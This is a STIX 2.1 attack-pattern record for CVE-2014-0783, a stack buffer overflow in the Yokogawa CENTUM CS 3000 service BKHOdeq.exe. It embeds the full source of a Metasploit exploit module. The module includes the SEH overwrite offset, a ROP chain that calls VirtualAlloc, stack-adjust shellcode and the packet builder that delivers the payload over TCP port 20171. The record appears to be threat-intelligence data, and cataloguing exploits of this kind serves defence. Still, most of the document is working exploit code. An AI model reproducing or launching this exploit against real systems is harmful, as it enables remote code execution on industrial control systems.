{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cf8a1a85-c63c-4f04-ade5-fafe14d1d204",
    "created": "2024-08-14T16:39:23.747688Z",
    "modified": "2024-08-14T16:39:23.747692Z",
    "name": "Yokogawa CENTUM CS 3000 BKHOdeq.exe Buffer Overflow",
    "description": " This module exploits a stack based buffer overflow in Yokogawa CENTUM CS 3000. The vulnerability exists in the service BKHOdeq.exe when handling specially crafted packets. This module has been tested successfully on Yokogawa CENTUM CS 3000 R3.08.50 over Windows XP SP3 and Windows 2003 SP2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/yokogawa_bkhodeq_bof.rb",
            "external_id": "yokogawa_bkhodeq_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.yokogawa.com/dcs/security/ysar/YSAR-14-0001E.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2014/03/10/yokogawa-centum-cs3000-vulnerabilities"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-0783"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Yokogawa CENTUM CS 3000 BKHOdeq.exe Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack based buffer overflow in Yokogawa CENTUM CS 3000. The vulnerability\n        exists in the service BKHOdeq.exe when handling specially crafted packets. This module has\n        been tested successfully on Yokogawa CENTUM CS 3000 R3.08.50 over Windows XP SP3 and Windows\n        2003 SP2.\n      },\n      'Author'         =>\n        [\n          'juan vazquez',\n          'Redsadic <julian.vilas[at]gmail.com>'\n        ],\n      'References'     =>\n        [\n          [ 'URL', 'http://www.yokogawa.com/dcs/security/ysar/YSAR-14-0001E.pdf' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2014/03/10/yokogawa-centum-cs3000-vulnerabilities' ],\n          [ 'CVE', '2014-0783']\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 6000,\n          'DisableNops' => true,\n          'BadChars'    => \":\\r\\n\"\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Yokogawa CENTUM CS 3000 R3.08.50 / Windows [ XP SP3 / 2003 SP2 ]',\n            {\n              'Ret'    => 0x0042068e, # stackpivot from 2488 BKHOdeq.exe # ADD ESP,9B8 # RETN\n              'Offset' => 8660,\n              'StackPivotAdjustment' => 108\n            }\n          ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n          'WfsDelay' => 10\n        },\n      'DisclosureDate' => '2014-03-10',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        # Required for EIP offset\n        Opt::RPORT(20171)\n      ])\n  end\n\n  def check\n    # It forces an huge allocation, which should fail,\n    # and return back an error answer from the server\n    # while parsing the packet header.\n    pkt = build_pkt(0xffffffff)\n    res = send_pkt(pkt)\n    if valid_response?(res)\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    my_payload = payload.encoded\n    rop_chain = create_rop_chain\n\n    data = rand_text(target['StackPivotAdjustment'])\n    data << rop_chain\n    data << stack_adjust\n    data << my_payload\n    data << rand_text(target['Offset'] - data.length)\n    data << generate_seh_record(target.ret)\n\n    pkt = build_pkt(data.length, data)\n\n    print_status(\"Trying target #{target.name}, sending #{pkt.length} bytes...\")\n    connect\n    sock.put(pkt)\n    disconnect\n  end\n\n  def build_pkt(data_length, data = \"\")\n    header = rand_text(4)             # iMark\n    header << [data_length].pack(\"N\") # Data length\n    header << rand_text(4)            # NumSet\n    header << rand_text(2)            # req\n    header << rand_text(2)            # Unknown\n\n    pkt = header + data\n\n    pkt\n  end\n\n  def send_pkt(data)\n    connect\n    sock.put(data)\n    res = sock.get_once\n    disconnect\n\n    res\n  end\n\n  def valid_response?(data)\n    return false unless data\n    return false unless data.length == 4\n    return false unless result_code(data) == 0\n\n    true\n  end\n\n  def result_code(data)\n    data.unpack(\"N\").first\n  end\n\n  def stack_adjust\n    adjust = \"\\x64\\xa1\\x18\\x00\\x00\\x00\"  # mov eax, fs:[0x18 # get teb\n    adjust << \"\\x83\\xC0\\x08\"             # add eax, byte 8 # get pointer to stacklimit\n    adjust << \"\\x8b\\x20\"                 # mov esp, [eax] # put esp at stacklimit\n    adjust << \"\\x81\\xC4\\x30\\xF8\\xFF\\xFF\" # add esp, -2000 # plus a little offset\n\n    adjust\n  end\n\n  def create_rop_chain\n    # rop chain generated with mona.py - www.corelan.be\n    rop_gadgets =\n      [\n        0x63b27a60,  # RET # padding on XP SP3\n        0x63b27a60,  # RET # padding on XP SP3\n        0x63b27a5f,  # POP EAX # RETN [libbkhMsg.dll]\n        0x61e761e0,  # ptr to &VirtualAlloc() [IAT LibBKCCommon.dll]\n        0x61e641e4,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [LibBKCCommon.dll]\n        0x00405522,  # PUSH EAX # TEST EAX,C0330042 # POP ESI # ADD ESP,6D8 # RETN [BKHOdeq.exe]\n      ].flatten.pack(\"V*\")\n    rop_gadgets << rand_text(1752) # Padding because of the \"ADD ESP,6D8\" instr\n    rop_gadgets << [\n        0x61e62aa4,  # POP EBP # RETN [LibBKCCommon.dll]\n        0x61e648c0,  # & push esp # ret  [LibBKCCommon.dll]\n        0x66f3243f,  # POP EBX # RETN [libBKBEqrp.dll]\n        0x00000001,  # 0x00000001-> ebx\n        0x61e729dd,  # POP EDX # MOV EAX,5E5FFFFF # RETN [LibBKCCommon.dll]\n        0x00001000,  # 0x00001000-> edx\n        0x63a93f6f,  # POP ECX # RETN [libbkhopx.dll]\n        0x00000040,  # 0x00000040-> ecx\n        0x63ad1f6a,  # POP EDI # RETN [libbkhOdeq.dll]\n        0x63dd3812,  # RETN (ROP NOP) [libbkhCsSrch.dll]\n        0x61e60b4c,  # POP EAX # RETN [LibBKCCommon.dll]\n        0x90909090,  # nop\n        0x63ae5cc3,  # PUSHAD # RETN [libbkhOdbh.dll]\n      ].flatten.pack(\"V*\")\n\n    rop_gadgets\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-03-10",
    "x_mitre_platforms": [
        "win'"
    ]
}